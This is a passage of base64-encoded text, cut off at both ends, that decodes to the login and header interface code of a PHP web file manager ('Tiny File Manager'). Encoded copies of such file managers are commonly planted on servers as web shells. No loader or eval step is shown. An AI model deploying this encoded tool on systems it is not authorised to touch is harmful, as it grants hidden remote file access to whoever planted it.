wIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTQ4IDMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMiA0OGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyLTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzIgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2LTY0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDk2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMTQ0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAzMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tOTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTk2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYtNjRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0zMiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6TTQ5IDM2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTMyIDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6TTMzIDY4YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtNDhhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDI0MGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2LTY0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNi0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTgwLTE3NmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMiA0OGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0zMmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTExMiAxNzZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6TTE3IDE4MGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6TTE3IDg0YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzIgNjRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6JyUzRSUzQy9wYXRoJTNFJTNDL3N2ZyUzRSIpO30KICAgICAgICAuZm0tbG9naW4tcGFnZSAuYnJhbmR7IHdpZHRoOjEyMXB4O292ZXJmbG93OmhpZGRlbjttYXJnaW46MCBhdXRvO3Bvc2l0aW9uOnJlbGF0aXZlO3otaW5kZXg6MX0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuYnJhbmQgaW1neyB3aWR0aDoxMDAlfQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLXdyYXBwZXJ7IHdpZHRoOjM2MHB4O21hcmdpbi10b3A6MTAlO21hcmdpbi1sZWZ0OmF1dG87bWFyZ2luLXJpZ2h0OmF1dG87fQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkeyBib3JkZXItY29sb3I6dHJhbnNwYXJlbnQ7Ym94LXNoYWRvdzowIDRweCA4cHggcmdiYSgwLDAsMCwuMDUpfQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLXRpdGxleyBtYXJnaW4tYm90dG9tOjEuNXJlbTtmb250LXNpemU6MjRweDtmb250LXdlaWdodDo0MDA7fQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5mb3JtLWNvbnRyb2x7IGJvcmRlci13aWR0aDoyLjNweH0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9ybS1ncm91cCBsYWJlbHsgd2lkdGg6MTAwJX0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuYnRuLmJ0bi1ibG9ja3sgcGFkZGluZzoxMnB4IDEwcHh9CiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmZvb3RlcnsgbWFyZ2luOjQwcHggMDtjb2xvcjojODg4O3RleHQtYWxpZ246Y2VudGVyfQogICAgICAgIEBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6NDI1cHgpeyAKICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQtd3JhcHBlcnsgd2lkdGg6OTAlO21hcmdpbjowIGF1dG87bWFyZ2luLXRvcDoxMCU7fQogICAgICAgIH0KICAgICAgICBAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOjMyMHB4KXsgCiAgICAgICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLmZhdHsgcGFkZGluZzowfQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC5mYXQgLmNhcmQtYm9keXsgcGFkZGluZzoxNXB4fQogICAgICAgIH0KICAgICAgICAubWVzc2FnZXsgcGFkZGluZzo0cHggN3B4O2JvcmRlcjoxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmZ9CiAgICAgICAgLm1lc3NhZ2Uub2t7IGJvcmRlci1jb2xvcjpncmVlbjtjb2xvcjpncmVlbn0KICAgICAgICAubWVzc2FnZS5lcnJvcnsgYm9yZGVyLWNvbG9yOnJlZDtjb2xvcjpyZWR9CiAgICAgICAgLm1lc3NhZ2UuYWxlcnR7IGJvcmRlci1jb2xvcjpvcmFuZ2U7Y29sb3I6b3JhbmdlfQogICAgICAgIGJvZHkuZm0tbG9naW4tcGFnZS50aGVtZS1kYXJrIHtiYWNrZ3JvdW5kLWNvbG9yOiAjMmYyYTJhO30KICAgICAgICAudGhlbWUtZGFyayBzdmcgZywgLnRoZW1lLWRhcmsgc3ZnIHBhdGgge2ZpbGw6ICNmZmZmZmY7IH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHkgY2xhc3M9ImZtLWxvZ2luLXBhZ2UgPD9waHAgZWNobyAoRk1fVEhFTUUgPT0gImRhcmsiKSA/ICd0aGVtZS1kYXJrJyA6ICcnOyA/PiI+CjxkaXYgaWQ9IndyYXBwZXIiIGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoKICAgIDw/cGhwCiAgICB9CgogICAgLyoqCiAgICAgKiBTaG93IHBhZ2UgZm9vdGVyIGluIExvZ2luIEZvcm0KICAgICAqLwogICAgZnVuY3Rpb24gZm1fc2hvd19mb290ZXJfbG9naW4oKQogICAgewogICAgPz4KPC9kaXY+CjxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjUuMS9qcXVlcnkuc2xpbS5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjAvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo8P3BocAp9CgovKioKICogU2hvdyBIZWFkZXIgYWZ0ZXIgbG9naW4KICovCmZ1bmN0aW9uIGZtX3Nob3dfaGVhZGVyKCkKewokc3ByaXRlc192ZXIgPSAnMjAxNjAzMTUnOwpoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7CmhlYWRlcigiRXhwaXJlczogU2F0LCAyNiBKdWwgMTk5NyAwNTowMDowMCBHTVQiKTsKaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIpOwpoZWFkZXIoIlByYWdtYTogbm8tY2FjaGUiKTsKCmdsb2JhbCAkbGFuZywgJHJvb3RfdXJsLCAkc3RpY2t5X25hdmJhciwgJGZhdmljb25fcGF0aDsKJGlzU3RpY2t5TmF2QmFyID0gJHN0aWNreV9uYXZiYXIgPyAnbmF2YmFyLWZpeGVkJyA6ICduYXZiYXItbm9ybWFsJzsKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iV2ViIGJhc2VkIEZpbGUgTWFuYWdlciBpbiBQSFAsIE1hbmFnZSB5b3VyIGZpbGVzIGVmZmljaWVudGx5IGFuZCBlYXNpbHkgd2l0aCBUaW55IEZpbGUgTWFuYWdlciI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkNDUCBQcm9ncmFtbWVycyI+CiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4KICAgIDxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0ibm9pbmRleCI+CiAgICA8bGluayByZWw9Imljb24iIGhyZWY9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmYXZpY29uX3BhdGgpID8+IiB0eXBlPSJpbWFnZS9wbmciPgogICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz48L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjUuMC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNC43LjAvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZWtrby1saWdodGJveC81LjMuMC9la2tvLWxpZ2h0Ym94LmNzcyIgLz4KICAgIDw/cGhwIGlmIChGTV9VU0VfSElHSExJR0hUSlMpOiA/PgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9oaWdobGlnaHQuanMvMTAuMC4zL3N0eWxlcy88P3BocCBlY2hvIEZNX0hJR0hMSUdIVEpTX1NUWUxFID8+Lm1pbi5jc3MiPgogICAgPD9waHAgZW5kaWY7ID8+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtc2l6ZToxNHB4O2NvbG9yOiMyMjI7YmFja2dyb3VuZDojRjdGN0Y3OyB9CiAgICAgICAgYm9keS5uYXZiYXItZml4ZWQgeyBtYXJnaW4tdG9wOjU1cHg7IH0KICAgICAgICBhOmhvdmVyLCBhOnZpc2l0ZWQsIGE6Zm9jdXMgeyB0ZXh0LWRlY29yYXRpb246bm9uZSAhaW1wb3J0YW50OyB9CiAgICAgICAgKiB7IC13ZWJraXQtYm9yZGVyLXJhZGl1czowICFpbXBvcnRhbnQ7LW1vei1ib3JkZXItcmFkaXVzOjAgIWltcG9ydGFudDtib3JkZXItcmFkaXVzOjAgIWltcG9ydGFudDsgfQogICAgICAgIC5maWxlbmFtZSwgdGQsIHRoIHsgd2hpdGUtc3BhY2U6bm93cmFwICB9CiAgICAgICAgLm5hdmJhci1icmFuZCB7IGZvbnQtd2VpZ2h0OmJvbGQ7IH0KICAgICAgICAubmF2LWl0ZW0uYXZhdGFyIGEgeyBjdXJzb3I6cG9pbnRlcjt0ZXh0LXRyYW5zZm9ybTpjYXBpdGFsaXplOyB9CiAgICAgICAgLm5hdi1pdGVtLmF2YXRhciBhID4gaSB7IGZvbnQtc2l6ZToxNXB4OyB9CiAgICAgICAgLm5hdi1pdGVtLmF2YXRhciAuZHJvcGRvd24tbWVudSBhIHsgZm9udC1zaXplOjEzcHg7IH0KICAgICAgICAjc2VhcmNoLWFkZG9uIHsgZm9udC1zaXplOjEycHg7Ym9yZGVyLXJpZ2h0LXdpZHRoOjA7IH0KICAgICAgICAjc2VhcmNoLWFkZG9uMiB7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Ym9yZGVyLWxlZnQ6MDsgfQogICAgICAgIC5icmVhZC1jcnVtYiB7IGNvbG9yOiNjY2NjY2M7Zm9udC1zdHlsZTpub3JtYWw7IH0KICAgICAgICAjbWFpbi10YWJsZSAuZmlsZW5hbWUgYSB7IGNvbG9yOiMyMjIyMjI7IH0KICAgICAgICAudGFibGUgdGQsIC50YWJsZSB0aCB7IHZlcnRpY2FsLWFsaWduOm1pZGRsZSAhaW1wb3J0YW50OyB9CiAgICAgICAgLnRhYmxlIC5jdXN0b20tY2hlY2tib3gtdGQgLmN1c3RvbS1jb250cm9sLmN1c3RvbS1jaGVja2JveCwgLnRhYmxlIC5jdXN0b20tY2hlY2tib3gtaGVhZGVyIC5jdXN0b20tY29udHJvbC5jdXN0b20tY2hlY2tib3ggeyBtaW4td2lkdGg6MThweDsgfQogICAgICAgIC50YWJsZS1zbSB0ZCwgLnRhYmxlLXNtIHRoIHsgcGFkZGluZzouNHJlbTsgfQogICAgICAgIC50YWJsZS1ib3JkZXJlZCB0ZCwgLnRhYmxlLWJvcmRlcmVkIHRoIHsgYm9yZGVyOjFweCBzb2xpZCAjZjFmMWYxOyB9CiAgICAgICAgLmhpZGRlbiB7IGRpc3BsYXk6bm9uZSAgfQogICAgICAgIHByZS53aXRoLWhsanMgeyBwYWRkaW5nOjAgIH0KICAgICAgICBwcmUud2l0aC1obGpzIGNvZGUgeyBtYXJnaW46MDtib3JkZXI6MDtvdmVyZmxvdzp2aXNpYmxlICB9CiAgICAgICAgY29kZS5tYXhoZWlnaHQsIHByZS5tYXhoZWlnaHQgeyBtYXgtaGVpZ2h0OjUxMnB4ICB9CiAgICAgICAgLmZhLmZhLWNhcmV0LXJpZ2h0IHsgZm9udC1zaXplOjEuMmVtO21hcmdpbjowIDRweDt2ZXJ0aWNhbC1hbGlnbjptaWRkbGU7Y29sb3I6I2VjZWNlYyAgfQogICAgICAgIC5mYS5mYS1ob21lIHsgZm9udC1zaXplOjEuM2VtO3ZlcnRpY2FsLWFsaWduOmJvdHRvbSAgfQogICAgICAgIC5wYXRoIHsgbWFyZ2luLWJvdHRvbToxMHB4ICB9CiAgICAgICAgZm9ybS5kcm9wem9uZSB7IG1pbi1oZWlnaHQ6MjAwcHg7Ym9yZGVyOjJweCBkYXNoZWQgIzAwN2JmZjtsaW5lLWhlaWdodDo2cmVtOyB9CiAgICAgICAgLnJpZ2h0IHsgdGV4dC1hbGlnbjpyaWdodCAgfQogICAgICAgIC5jZW50ZXIsIC5jbG9zZSwgLmxvZ2luLWZvcm0geyB0ZXh0LWFsaWduOmNlbnRlciAgfQogICAgICAgIC5tZXNzYWdlIHsgcGFkZGluZzo0cHggN3B4O2JvcmRlcjoxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmYgIH0KICAgICAgICAubWVzc2FnZS5vayB7IGJvcmRlci1jb2xvcjpncmVlbjtjb2xvcjpncmVlbiAgfQogICAgICAgIC5tZXNzYWdlLmVycm9yIHsgYm9yZGVyLWNvbG9yOnJlZDtjb2xvcjpyZWQgIH0KICAgICAgICAubWVzc2FnZS5hbGVydCB7IGJvcmRlci1jb2xvcjpvcmFuZ2U7Y29sb3I6b3JhbmdlICB9CiAgICAgICAgLnByZXZpZXctaW1nIHsgbWF4LXdpZHRoOjEwMCU7YmFja2dyb3VuZDp1cmwoZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCQUFBQUFRQ0FJQUFBQ1FrV2cyQUFBQUtrbEVRVlI0Mm1MNS8vOC9BemJ3K1BGanJPSk1EQ1NDVVEzRUFCWmM0UzByS3pzYVN2VFRBQkJnQU15ZkNNc1k0QjlpQUFBQUFFbEZUa1N1UW1DQykgIH0KICAgICAgICAuaW5saW5lLWFjdGlvbnMgPiBhID4gaSB7IGZvbnQtc2l6ZToxZW07bWFyZ2luLWxlZnQ6NXB4O2JhY2tncm91bmQ6IzM3ODVjMTtjb2xvcjojZmZmO3BhZGRpbmc6M3B4O2JvcmRlci1yYWRpdXM6M3B4ICB9CiAgICAgICAgLnByZXZpZXctdmlkZW8geyBwb3NpdGlvbjpyZWxhdGl2ZTttYXgtd2lkdGg6MTAwJTtoZWlnaHQ6MDtwYWRkaW5nLWJvdHRvbTo2Mi41JTttYXJnaW4tYm90dG9tOjEwcHggIH0KICAgICAgICAucHJldmlldy12aWRlbyB2aWRlbyB7IHBvc2l0aW9uOmFic29sdXRlO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7bGVmdDowO3RvcDowO2JhY2tncm91bmQ6IzAwMCAgfQogICAgICAgIC5jb21wYWN0LXRhYmxlIHsgYm9yZGVyOjA7d2lkdGg6YXV0byAgfQogICAgICAgIC5jb21wYWN0LXRhYmxlIHRkLCAuY29tcGFjdC10YWJsZSB0aCB7IHdpZHRoOjEwMHB4O2JvcmRlcjowO3RleHQtYWxpZ246Y2VudGVyICB9CiAgICAgICAgLmNvbXBhY3QtdGFibGUgdHI6aG92ZXIgdGQgeyBiYWNrZ3JvdW5kLWNvbG9yOiNmZmYgIH0KICAgICAgICAuZmlsZW5hbWUgeyBtYXgtd2lkdGg6NDIwcHg7b3ZlcmZsb3c6aGlkZGVuO3RleHQtb3ZlcmZsb3c6ZWxsaXBzaXMgIH0KICAgICAgICAuYnJlYWstd29yZCB7IHdvcmQtd3JhcDpicmVhay13b3JkO21hcmdpbi1sZWZ0OjMwcHggIH0KICAgICAgICAuYnJlYWstd29yZC5mbG9hdC1sZWZ0IGEgeyBjb2xvcjojN2Q3ZDdkICB9CiAgICAgICAgLmJyZWFrLXdvcmQgKyAuZmxvYXQtcmlnaHQgeyBwYWRkaW5nLXJpZ2h0OjMwcHg7cG9zaXRpb246cmVsYXRpdmUgIH0KICAgICAgICAuYnJlYWstd29yZCArIC5mbG9hdC1yaWdodCA+IGEgeyBjb2xvcjojN2Q3ZDdkO2ZvbnQtc2l6ZToxLjJlbTttYXJnaW4tcmlnaHQ6NHB4ICB9CiAgICAgICAgI2VkaXRvciB7IHBvc2l0aW9uOmFic29sdXRlO3JpZ2h0OjE1cHg7dG9wOjEwMHB4O2JvdHRvbToxNXB4O2xlZnQ6MTVweCAgfQogICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOjQ4MXB4KSB7IAogICAgICAgICAgICAjZWRpdG9yIHsgdG9wOjE1MHB4OyB9CiAgICAgICAgfQogICAgICAgICNub3JtYWwtZWRpdG9yIHsgYm9yZGVyLXJhZGl1czozcHg7Ym9yZGVyLXdpZHRoOjJweDtwYWRkaW5nOjEwcHg7b3V0bGluZTpub25lOyB9CiAgICAgICAgLmJ0bi0yIHsgYm9yZGVyLXJhZGl1czowO3BhZGRpbmc6M3B4IDZweDtmb250LXNpemU6c21hbGw7IH0KICAgICAgICBsaS5maWxlOmJlZm9yZSxsaS5mb2xkZXI6YmVmb3JlIHsgZm9udDpub3JtYWwgbm9ybWFsIG5vcm1hbCAxNHB4LzEgRm9udEF3ZXNvbWU7Y29udGVudDoiXGYwMTYiO21hcmdpbi1yaWdodDo1cHggfQogICAgICAgIGxpLmZvbGRlcjpiZWZvcmUgeyBjb250ZW50OiJcZjExNCIgfQogICAgICAgIGkuZmEuZmEtZm9sZGVyLW8geyBjb2xvcjojMDE1N2IzIH0KICAgICAgICBpLmZhLmZhLXBpY3R1cmUtbyB7IGNvbG9yOiMyNmI5OWEgfQogICAgICAgIGkuZmEuZmEtZmlsZS1hcmNoaXZlLW8geyBjb2xvcjojZGE3ZDdkIH0KICAgICAgICAuYnRuLTIgaS5mYS5mYS1maWxlLWFyY2hpdmUtbyB7IGNvbG9yOmluaGVyaXQgfQogICAgICAgIGkuZmEuZmEtY3NzMyB7IGNvbG9yOiNmMzZmYTAgfQogICAgICAgIGkuZmEuZmEtZmlsZS1jb2RlLW8geyBjb2xvcjojMDA3YmZmIH0KICAgICAgICBpLmZhLmZhLWNvZGUgeyBjb2xvcjojY2M0YjRjIH0KICAgICAgICBpLmZhLmZhLWZpbGUtdGV4dC1vIHsgY29sb3I6IzAwOTZlNiB9CiAgICAgICAgaS5mYS5mYS1odG1sNSB7IGNvbG9yOiNkNzVlNzIgfQogICAgICAgIGkuZmEuZmEtZmlsZS1leGNlbC1vIHsgY29sb3I6IzA5YzU1ZCB9CiAgICAgICAgaS5mYS5mYS1maWxlLXBvd2VycG9pbnQtbyB7IGNvbG9yOiNmNjcxMmUgfQogICAgICAgIGkuZ28tYmFjayB7IGZvbnQtc2l6ZToxLjJlbTtjb2xvcjojMDA3YmZmOyB9CiAgICAgICAgLm1haW4tbmF2IHsgcGFkZGluZzowLjJyZW0gMXJlbTtib3gtc2hhZG93OjAgNHB4IDVweCAwIHJnYmEoMCwgMCwgMCwgLjE0KSwgMCAxcHggMTBweCAwIHJnYmEoMCwgMCwgMCwgLjEyKSwgMCAycHggNHB4IC0xcHggcmdiYSgwLCAwLCAwLCAuMikgIH0KICAgICAgICAuZGF0YVRhYmxlc19maWx0ZXIgeyBkaXNwbGF5Om5vbmU7IH0KICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgLnNvcnRpbmcgeyBjdXJzb3I6cG9pbnRlcjtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7YmFja2dyb3VuZC1wb3NpdGlvbjpjZW50ZXIgcmlnaHQ7YmFja2dyb3VuZC1pbWFnZTp1cmwoJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQk1BQUFBVENBUUFBQURZV2Y1SEFBQUFrRWxFUVZRb3o3WFFNUTVBUUJDRjRkV1FTSnhDNXd3YXgxQ3ExZTdCQWR4RDVTTCtUcS9RQ00xb05pSmlkd294MDM1NW1YbkcvRHJFdElRNmF6aW9OWlF4STB5a1BoVFFJd2hDUitCbUJZdGxLN2tMSll3V0NjSkE5TTRxZHJacmQ4cFBqWldQdE9xZFJReTMyMFlTVjE3T2F0RkM0ZXV0czZ6MzlHWU1LUlBDVEtZOVVuUFE2UCtHdE1SZkd0UG5CQ2lxaEFlSlBta3FBQUFBQUVsRlRrU3VRbUNDJyk7IH0KICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgLnNvcnRpbmdfYXNjIHsgY3Vyc29yOnBvaW50ZXI7YmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0O2JhY2tncm91bmQtcG9zaXRpb246Y2VudGVyIHJpZ2h0O2JhY2tncm91bmQtaW1hZ2U6dXJsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJNQUFBQVRDQVlBQUFCeVVEYk1BQUFBWjBsRVFWUTR5Mk5nR0xLZ3F1RXVGeEJQQUdJMmFoaFdDc1MvZ0RpYlVvTzBnUGd4RVA4SDR0dEFyRXl1UVl4QVBCZHFFQXhQQkltVFk1Z2pFTDlETSt3VEVOdVFhaEF2RU85RE13aUdkd0F4T3ltR0pRTHhUeUQramdXRHhDTVpSc0VvR0FWb0FBRGVlbXd0UGNaSTJ3QUFBQUJKUlU1RXJrSmdnZz09Jyk7IH0KICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgLnNvcnRpbmdfZGVzYyB7IGN1cnNvcjpwb2ludGVyO2JhY2tncm91bmQtcmVwZWF0Om5vLXJlcGVhdDtiYWNrZ3JvdW5kLXBvc2l0aW9uOmNlbnRlciByaWdodDtiYWNrZ3JvdW5kLWltYWdlOnVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FZQUFBQnlVRGJNQUFBQVpVbEVRVlE0eTJOZ0dBV2pZQlNnZ2FxR3U1RkEvQk9JdjJQQklQRkVVZ3hqQitJZFFQd2ZDOTRIeEx5a3VzNEdpRCtoR2ZRT2lCM0o4U29qRUU5RU0yd3VTSnpjc0ZNRzR0dFFneDREc1JhbGtaRU54TCtBdUpRYU1jc0d4Qk9BbUd2b3BrOEFWejFzTFpnZzBic0FBQUFBU1VWT1JLNUNZSUk9Jyk7IH0KICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgdHI6Zmlyc3QtY2hpbGQgdGguY3VzdG9tLWNoZWNrYm94LWhlYWRlcjpmaXJzdC1jaGlsZCB7IGJhY2tncm91bmQtaW1hZ2U6bm9uZTsgfQogICAgICAgIC5mb290ZXItYWN0aW9uIGxpIHsgbWFyZ2luLWJvdHRvbToxMHB4OyB9CiAgICAgICAgLmFwcC12LXRpdGxlIHsgZm9udC1zaXplOjI0cHg7Zm9udC13ZWlnaHQ6MzAwO2xldHRlci1zcGFjaW5nOi0uNXB4O3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgfQogICAgICAgIGhyLmN1c3RvbS1ociB7IGJvcmRlci10b3A6MXB4IGRhc2hlZCAjOGM4YjhiO2JvcmRlci1ib3R0b206MXB4IGRhc2hlZCAjZmZmOyB9CiAgICAgICAgLmVra28tbGlnaHRib3ggLm1vZGFsLWRpYWxvZyB7IG1heC13aWR0aDo5OCU7IH0KICAgICAgICAuZWtrby1saWdodGJveC1pdGVtLmZhZGUuaW4uc2hvdyAucm93IHsgYmFja2dyb3VuZDojZmZmOyB9CiAgICAgICAgLmVra28tbGlnaHRib3gtbmF2LW92ZXJsYXkgeyBkaXNwbGF5OmZsZXggIWltcG9ydGFudDtvcGFjaXR5OjEgIWltcG9ydGFudDtoZWlnaHQ6YXV0byAhaW1wb3J0YW50O3RvcDo1MCU7IH0KICAgICAgICAuZWtrby1saWdodGJveC1uYXYtb3ZlcmxheSBhIHsgb3BhY2l0eToxICFpbXBvcnRhbnQ7d2lkdGg6YXV0byAhaW1wb3J0YW50O3RleHQtc2hhZG93Om5vbmUgIWltcG9ydGFudDtjb2xvcjojM0IzQjNCOyB9CiAgICAgICAgLmVra28tbGlnaHRib3gtbmF2LW92ZXJsYXkgYTpob3ZlciB7IGNvbG9yOiMyMDUwN0Q7IH0KICAgICAgICAjc